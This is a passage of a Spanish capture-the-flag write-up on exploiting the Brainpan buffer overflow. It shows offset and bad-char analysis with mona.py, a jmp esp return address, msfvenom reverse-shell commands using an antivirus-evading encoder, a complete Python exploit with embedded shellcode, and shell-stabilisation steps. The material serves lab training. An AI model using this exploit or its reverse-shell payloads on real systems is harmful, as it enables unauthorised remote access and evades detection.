0x73413973</code> y nos indica que existe un <code class="language-plaintext highlighter-rouge">offset</code> desde el inicio hasta este codigo, de <code class="language-plaintext highlighter-rouge">524</code> caracteres. Despues de esto la ventana de <code class="language-plaintext highlighter-rouge">gdb-peda</code> puede ser cerrada. <img data-src="https://user-images.githubusercontent.com/85322110/149213047-9a0a35a7-449b-4ea2-9248-2b4cef8af584.png" alt="image" data-proofer-ignore> <img data-src="https://user-images.githubusercontent.com/85322110/149213005-2b68526d-6940-4011-affa-fb7c776f0caf.png" alt="image" data-proofer-ignore></p><p>Ya con esto tenemos el offset que necesitamos enviar antes de llegar al registro <code class="language-plaintext highlighter-rouge">EIP</code>, la idea ahora es enviar los <code class="language-plaintext highlighter-rouge">524</code> caracteres primarios del offset, luego enviar el <code class="language-plaintext highlighter-rouge">EIP</code> que son <code class="language-plaintext highlighter-rouge">4</code> caracteres mas, y luego de esto enviaremos nuestro <code class="language-plaintext highlighter-rouge">payload</code> (que al ver la respuesta del servidor, vemos que el restante de la cadena luego de los primeros <code class="language-plaintext highlighter-rouge">528</code> caracteres, se guardan en el registro <code class="language-plaintext highlighter-rouge">ESP</code>) con el objetivo final de obtener una <code class="language-plaintext highlighter-rouge">reverse shell</code> (consola remota) a nuestro equipo, sin embargo no es tan sencillo como colocar el EIP apuntando a la direccion de memoria donde estara el payload, pues <em>existen 2 inconvenientes</em>:</p><ol><li>En ciertos binarios existen caracteres que no son correctamente interpretados por el computador, estos son llamados <code class="language-plaintext highlighter-rouge">bar chars</code> o caracteres malos, es necesario encontrar y evitar el uso de estos <code class="language-plaintext highlighter-rouge">bad chars</code> en la creacion del payload de explotacion.<li>No se puede apuntar directamente con el <code class="language-plaintext highlighter-rouge">EIP</code> hacia el registro donde se esta guardando el resto de nuestro payload que seria el registro <code class="language-plaintext highlighter-rouge">ESP</code>, apuntar a su direccion directamente nos llevaria a un error de ejecucion.</ol><p>Para resolver el primer problema, retocaremos nuestro script en Python para mandar: <code class="language-plaintext highlighter-rouge">524 chars (offset) + 4 chars (EIP) + bytearray</code> donde <code class="language-plaintext highlighter-rouge">bytearray</code> seran <strong>todos los numeros hexadecimales de 16 bits</strong>, es decir, desde el <code class="language-plaintext highlighter-rouge">0x00</code> hasta el <code class="language-plaintext highlighter-rouge">0xFF</code> o <code class="language-plaintext highlighter-rouge">\xFF</code>. Para crear esta cadena de bytes automaticamente podemos hacer uso de <a href="https://github.com/corelan/mona">mona.py</a> que es un tipo de “plug-in” para <code class="language-plaintext highlighter-rouge">Immunity Debugger</code>, seguimos los pasos para su instalacion y procedemos a usarlo de la siguiente manera:</p><p>Maximizamos <code class="language-plaintext highlighter-rouge">Immunity Debugger</code> y en la linea de entrada de comandos de abajo introducir el siguiente comando para crear la carpeta de trabajo que <code class="language-plaintext highlighter-rouge">mona.py</code> usara (en mi caso decidi C:\brainpan): <img data-src="https://user-images.githubusercontent.com/85322110/149221708-78711d60-a53c-4da6-a7a2-5aff36fd3b74.png" alt="image" data-proofer-ignore></p><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="o">!</span>mona config <span class="nt">-set</span> workingfolder C:<span class="se">\%</span>p</code> Luego ya que tenemos la carpeta definida, utilizamos la funcion <code class="language-plaintext highlighter-rouge">!mona bytearray</code> para crear la cadena de bytes de la siguiente forma: <code class="language-plaintext highlight highlighter-rouge"><span class="o">!</span>mona bytearray <span class="nt">-cpb</span> <span class="se">\x</span>00</code> Donde <code class="language-plaintext highlighter-rouge">-cpb \x00</code> es para no colocar el bad char 0x00 que ya se sabe debe ignorarse. Esto creara en la carpeta configurada anteriormente dos archivos <code class="language-plaintext highlighter-rouge">bytearray.bin</code> y <code class="language-plaintext highlighter-rouge">bytearray.txt</code> que el archivo de texto lo pasaremos a nuestra maquina para copiar el array, y el <code class="language-plaintext highlighter-rouge">.bin</code> lo usaremos mas adalante para comparar si hay algun <code class="language-plaintext highlighter-rouge">bad char</code> o no.</p></blockquote><p>Una vez copiado el archivo <code class="language-plaintext highlighter-rouge">bytearray.txt</code> a nuestra maquina Linux (se hace con <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> de nuevo) podemos hacer uso de <code class="language-plaintext highlighter-rouge">grep</code> y <code class="language-plaintext highlighter-rouge">xclip</code> para copiar el contenido:</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="nb">grep</span> ^<span class="se">\"</span> bytearray.txt | xclip <span class="nt">-sel</span> clip</code> <img data-src="https://user-images.githubusercontent.com/85322110/149220672-474bc336-62fb-4039-baa0-3c87253e34d7.png" alt="image" data-proofer-ignore></p></blockquote><p>Y luego retocamos nuetro script para incluir estos bytes luego de la posicion del <code class="language-plaintext highlighter-rouge">EIP</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">ip_addr</span> <span class="o">=</span>  <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">524</span>
    <span class="n">eip</span> <span class="o">=</span> <span class="s">'B'</span><span class="o">*</span><span class="mi">4</span>
    <span class="n">command</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">command</span> 
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip_addr</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[*] Enviando payload..."</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="n">payload</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin1'</span><span class="p">))</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">    [!] Ocurrio un error!"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

</pre></table></code></div></div><p>Al enviar el script: <img data-src="https://user-images.githubusercontent.com/85322110/149221375-f9b3c99e-026a-4ca8-9336-e0bfb32bb555.png" alt="image" data-proofer-ignore> Vemos como efectivamente el <code class="language-plaintext highlighter-rouge">EIP</code> se muestra como <code class="language-plaintext highlighter-rouge">42424242</code> que significa <code class="language-plaintext highlighter-rouge">BBBB</code>, y justo despues de este viene el stack <code class="language-plaintext highlighter-rouge">ESP</code> en donde vemos todo nuestro <code class="language-plaintext highlighter-rouge">bytearray</code> desde <code class="language-plaintext highlighter-rouge">0x01</code> hasta <code class="language-plaintext highlighter-rouge">0xFF</code>, es ciertamente ineficiente revisar caracter por caracter, asi que haremos uso de <code class="language-plaintext highlighter-rouge">mona.py</code> nuevamente donde tiene una funcion que hace esto por nosotros. Solo es ejecutar la siguiente linea:</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="o">!</span>mona compare <span class="nt">-f</span> C:<span class="se">\b</span>rainpan<span class="se">\b</span>ytearray.bin <span class="nt">-a</span> 0x0022F930</code></p></blockquote><p>Comparamos el bytearray que creamos anteriormente con todo lo que viene a continuacion del <code class="language-plaintext highlighter-rouge">ESP</code> (0x0022F930) y esto nos devuelve una ventana donde no se presenta ningun <code class="language-plaintext highlighter-rouge">bad char</code> <img data-src="https://user-images.githubusercontent.com/85322110/149222484-079c9000-6236-45d3-83f2-d53e98fc9841.png" alt="image" data-proofer-ignore> Es decir que solo tenemos el <code class="language-plaintext highlighter-rouge">\x00</code> como <code class="language-plaintext highlighter-rouge">bad char</code>, en caso de que existiese otro solo mostraria uno solo, por lo tanto habria que recrear el <code class="language-plaintext highlighter-rouge">bytearray</code> excluyendo ese otro badchar con la forma <code class="language-plaintext highlighter-rouge">-cpb \x00\x??</code> y repetir todo el proceso, asi consecutivamente hasta que no nos muestre ningun <code class="language-plaintext highlighter-rouge">bad char</code> al hacer un <code class="language-plaintext highlighter-rouge">!mona compare</code></p><p>Ya con esto resolvemos el primer problema, ahora para el segundo tenemos lo siguiente:</p><p>Como no se puede apuntar directamente el <code class="language-plaintext highlighter-rouge">EIP</code> el stack <code class="language-plaintext highlighter-rouge">ESP</code> que es donde se deposita nuestro payload, debemos buscar una funcion en el mismo <code class="language-plaintext highlighter-rouge">brainpan.exe</code> que haga un salto al ESP <code class="language-plaintext highlighter-rouge">jmp esp</code>, de esta forma hariamos un salto indirecto hacia nuestro <code class="language-plaintext highlighter-rouge">payload</code>. Para encontrar un <code class="language-plaintext highlighter-rouge">jmp esp</code> dentro del programa, primero debemos buscar cual es el <code class="language-plaintext highlighter-rouge">Operation Code (opcode)</code> de <code class="language-plaintext highlighter-rouge">jmp esp</code> y lo logramos haciendo <code class="language-plaintext highlighter-rouge">Ctrl + F</code> dentro de Immunity Debugger. <img data-src="https://user-images.githubusercontent.com/85322110/149224942-ec8c8a51-e709-4b4b-b659-3b81ef2309bf.png" alt="image" data-proofer-ignore> Con eso vemos el codigo es <code class="language-plaintext highlighter-rouge">FFE4</code>, no debemos prestarle atencion a la direccion a la izquierda ya que esta varia y no funcionara si la ponemos en el <code class="language-plaintext highlighter-rouge">EIP</code>, en cambio podemos usar <code class="language-plaintext highlighter-rouge">mona.py</code> para ubicar donde se encontraria un <code class="language-plaintext highlighter-rouge">jmp esp</code> usable para esto, y lo hacemos con:</p><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="o">!</span>mona modules</code> para saber que modulo debemos usar (brainpan.exe) <img data-src="https://user-images.githubusercontent.com/85322110/149225255-90a8c500-2f5a-46c6-8db1-714b2d265f0b.png" alt="image" data-proofer-ignore></p></blockquote><blockquote><p><code class="language-plaintext highlight highlighter-rouge"><span class="o">!</span>mona <span class="nt">-m</span> brainpan.exe <span class="nt">-s</span> <span class="se">\x</span>FF<span class="se">\x</span>E4</code> para ubicar el pointer deseado <img data-src="https://user-images.githubusercontent.com/85322110/149225632-154d8992-8168-4700-ac51-3a762cbc720b.png" alt="image" data-proofer-ignore></p></blockquote><p>Vemos como el pointer <code class="language-plaintext highlighter-rouge">jmp esp</code> se ubica en la direccion <code class="language-plaintext highlighter-rouge">0x311712F3</code>, este seria finalmente nuestro <code class="language-plaintext highlighter-rouge">EIP</code> deseado, que hara una redireccion al <code class="language-plaintext highlighter-rouge">ESP</code> donde meteremos nuestro <code class="language-plaintext highlighter-rouge">payload</code> al culminar. Al momento de configurar esta direccion en el script de Python, es necesario saber que el <code class="language-plaintext highlighter-rouge">EIP</code> especificamente debe venir en formato <a href="https://es.wikipedia.org/wiki/Endianness">Little Endian</a>, para esto solo hay que invertir la posicion de los bytes, es decir que nuestra variable quedaria como <code class="language-plaintext highlighter-rouge">eip = "\xf3\x12\x17\x31"</code>.</p><p>Ahora solo resta crear un <code class="language-plaintext highlighter-rouge">payload</code> en formato shell que permita ejecutar acciones a bajo nivel que nos permita obtener una consola remota desde la maquina victima hacia nuestra maquina de atacante. Esto lo podremos lograr con la herramienta <code class="language-plaintext highlighter-rouge">msfvenom</code> del metasploit framework, que nos permite crear un payload rapidamente sin tener que estar inmersos en el entorno de metasploit.</p><p>Para nuestra maquina de pruebas utilizarmos el payload <code class="language-plaintext highlighter-rouge">windows/shell_reverse_tcp</code> que ejecuta una consola con conexion inversa a nosotros, para ello ejecutamos el comando</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nt">--platform</span> windows <span class="nt">-a</span> x86 <span class="nt">-f</span> python <span class="nt">-v</span> <span class="nb">command </span><span class="nv">LHOST</span><span class="o">=</span>192.168.132.128 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s1">'\x00'</span> <span class="nt">-e</span> x86/shikata_ga_nai<span class="sb">`</span> 
</pre></table></code></div></div><p>En donde usamos el <code class="language-plaintext highlighter-rouge">-p</code>ayload requerido, marcamos la <code class="language-plaintext highlighter-rouge">--platform</code> y su <code class="language-plaintext highlighter-rouge">-a</code>rquitectura, usamos el <code class="language-plaintext highlighter-rouge">-f</code>ormato python con la <code class="language-plaintext highlighter-rouge">-v</code>ariable commmand, usamos <code class="language-plaintext highlighter-rouge">LHOST / LPORT</code> de <em>nuestra maquina de atacante</em>, marcamos los <code class="language-plaintext highlighter-rouge">bad chars -b</code>, y finalmente usamos el <code class="language-plaintext highlighter-rouge">-e</code>ncoder <a href="https://security.stackexchange.com/questions/130256/what-is-shikata-ga-nai">shikata_ga_nai</a> para ofuscar nuestro comando y evitar detecciones de antimalwares. <img data-src="https://user-images.githubusercontent.com/85322110/149255828-21df4f67-1e41-4632-b2a9-167730d31d9e.png" alt="image" data-proofer-ignore></p><p>Copiamos estas lineas quitando la letra <code class="language-plaintext highlighter-rouge">b</code> en <code class="language-plaintext highlighter-rouge">b"\xxx\xxx..."</code> para quedarnos con variables en <code class="language-plaintext highlighter-rouge">str</code> y no en bytes ya que se codifican luego con <code class="language-plaintext highlighter-rouge">latin1</code>. Reemplazamos nuestra variable command y tambien agregamos <code class="language-plaintext highlighter-rouge">nops = "\x90"*20</code>, los <code class="language-plaintext highlighter-rouge">NOPs</code> son operaciones nulas en la ejecucion de comando, es decir, no hacer nada, estas no-instrucciones las ponemos antes de los comandos del payload, esto porque estos comandos van codificados con <code class="language-plaintext highlighter-rouge">shikata_ga_nai</code> y pueden tomar un tiempo en decodificarse, por lo que si no se espera y se pasa directo a la ejecucion de este, puede haber mala interpretacion del codigo.</p><p>Nuestro script <code class="language-plaintext highlighter-rouge">bofexploit.py</code> queda finalmente estructurado de la siguiente manera</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">time</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">ip_addr</span> <span class="o">=</span>  <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">524</span>
    <span class="n">eip</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf3\x12\x17\x31</span><span class="s">"</span>
    <span class="n">nops</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mi">20</span>
    <span class="n">command</span> <span class="o">=</span>  <span class="s">""</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb8\xad\x3d\x78\xbb\xda\xc9\xd9\x74\x24\xf4\x5f</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x31\xc9\xb1\x52\x31\x47\x12\x03\x47\x12\x83\x6a</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x39\x9a\x4e\x88\xaa\xd8\xb1\x70\x2b\xbd\x38\x95</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x1a\xfd\x5f\xde\x0d\xcd\x14\xb2\xa1\xa6\x79\x26</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x31\xca\x55\x49\xf2\x61\x80\x64\x03\xd9\xf0\xe7</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x87\x20\x25\xc7\xb6\xea\x38\x06\xfe\x17\xb0\x5a</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x57\x53\x67\x4a\xdc\x29\xb4\xe1\xae\xbc\xbc\x16</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x66\xbe\xed\x89\xfc\x99\x2d\x28\xd0\x91\x67\x32</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x35\x9f\x3e\xc9\x8d\x6b\xc1\x1b\xdc\x94\x6e\x62</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xd0\x66\x6e\xa3\xd7\x98\x05\xdd\x2b\x24\x1e\x1a</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x51\xf2\xab\xb8\xf1\x71\x0b\x64\x03\x55\xca\xef</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x0f\x12\x98\xb7\x13\xa5\x4d\xcc\x28\x2e\x70\x02</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb9\x74\x57\x86\xe1\x2f\xf6\x9f\x4f\x81\x07\xff</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x2f\x7e\xa2\x74\xdd\x6b\xdf\xd7\x8a\x58\xd2\xe7</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x4a\xf7\x65\x94\x78\x58\xde\x32\x31\x11\xf8\xc5</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x36\x08\xbc\x59\xc9\xb3\xbd\x70\x0e\xe7\xed\xea</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xa7\x88\x65\xea\x48\x5d\x29\xba\xe6\x0e\x8a\x6a</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x47\xff\x62\x60\x48\x20\x92\x8b\x82\x49\x39\x76</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x45\xb6\x16\xfc\x15\x5e\x65\xfc\x14\x24\xe0\x1a</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x7c\x4a\xa5\xb5\xe9\xf3\xec\x4d\x8b\xfc\x3a\x28</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x8b\x77\xc9\xcd\x42\x70\xa4\xdd\x33\x70\xf3\xbf</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x92\x8f\x29\xd7\x79\x1d\xb6\x27\xf7\x3e\x61\x70</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x50\xf0\x78\x14\x4c\xab\xd2\x0a\x8d\x2d\x1c\x8e</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x4a\x8e\xa3\x0f\x1e\xaa\x87\x1f\xe6\x33\x8c\x4b</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb6\x65\x5a\x25\x70\xdc\x2c\x9f\x2a\xb3\xe6\x77</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xaa\xff\x38\x01\xb3\xd5\xce\xed\x02\x80\x96\x12</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xaa\x44\x1f\x6b\xd6\xf4\xe0\xa6\x52\x14\x03\x62</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xaf\xbd\x9a\xe7\x12\xa0\x1c\xd2\x51\xdd\x9e\xd6</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x29\x1a\xbe\x93\x2c\x66\x78\x48\x5d\xf7\xed\x6e</span><span class="s">"</span>
    <span class="n">command</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xf2\xf8\x27</span><span class="s">"</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">command</span> 
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip_addr</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[*] Enviando payload..."</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="n">payload</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin1'</span><span class="p">))</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">    [!] Ocurrio un error!"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></table></code></div></div><p>Si re-abrimos el servicio <code class="language-plaintext highlighter-rouge">brainpan.exe</code> en nuestra maquina de prueba (sin utilizar el Immunity Debugger para que no pause la ejecucion) y ejecutamos el <code class="language-plaintext highlight highlighter-rouge">./bofexploit.py 192.168.132.131 9999</code> mientras en otra ventana hacemos un <code class="language-plaintext highlight highlighter-rouge"><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443</code> para escuchar con <code class="language-plaintext highlighter-rouge">netcat</code> el puerto en espera de una consola remota, observamos como se realiza la explotacion de la vulnerabilidad de desbordamiento de bufer para ganar acceso inicial a nuestro sistema de prueba: <img data-src="https://user-images.githubusercontent.com/85322110/149257218-451c7f3f-32b5-439d-b655-1dd93bc27672.png" alt="image" data-proofer-ignore></p><p>Ahora solo falta adaptar este exploit al sistema Linux en el que esta basado la maquina original de TryHackMe, para ello cambiaremos el payload del msfvenom a <code class="language-plaintext highlighter-rouge">linux/x86/shell_reverse_tcp</code>con la siguiente ejecucion:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp <span class="nt">-a</span> x86 <span class="nt">-f</span> python <span class="nt">-v</span> <span class="nb">command </span><span class="nv">LHOST</span><span class="o">=</span>10.8.33.130 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-b</span> <span class="s1">'\x00'</span> <span class="nt">-e</span> x86/shikata_ga_nai
</pre></table></code></div></div><p>De igual forma copiamos el texto en nuestro script, abrimos una instancia de <code class="language-plaintext highlighter-rouge">nc</code> y ejecutamos el exploit ahora contra la IP de la maquina de TryHackMe y ganamos acceso con una consola no muy interactiva: <img data-src="https://user-images.githubusercontent.com/85322110/149258869-18b22782-2cb9-4e44-95ed-b29235cdfdb9.png" alt="image" data-proofer-ignore></p><p>Con esto podremos completar nuestro segundo objetivo de la maquina…</p><h2 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS <a href="#escalada-de-privilegios" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Una vez tenemos acceso, lo primero que podemos hacer es obtener una consola mas interactiva haciendo uso de una serie de pasos que se explican a continuacion:</p><ul><li><code class="language-plaintext highlight highlighter-rouge">script /dev/null <span class="nt">-c</span> bash</code><li>En teclado <code class="language-plaintext highlighter-rouge">Ctrl + Z</code><li><code class="language-plaintext highlight highlighter-rouge"><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span></code><li>Escribir <code class="language-plaintext highlighter-rouge">reset</code> aunque no se vea<li><code class="language-plaintext highlighter-rouge">xterm</code> en Terminal Type<li><code class="language-plaintext highlight highlighter-rouge"><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash</code><li><code class="language-plaintext 